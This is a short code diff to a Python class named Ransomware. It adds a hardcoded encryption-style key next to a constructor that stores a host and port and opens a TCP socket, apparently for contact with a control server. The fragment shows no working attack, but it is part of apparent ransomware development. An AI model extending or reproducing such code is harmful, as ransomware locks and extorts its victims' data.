@@ -8,6 +8,7 @@ class Ransomware:
     def __init__(self, host: str, port: int) -> None:
         self.host = host
         self.port = port
+        self.key = b'ansfjinsdoifoiadfo'
         self.server: socket = socket(AF_INET, SOCK_STREAM)
 
     def ConnectServer(self, connected = False) -> None:
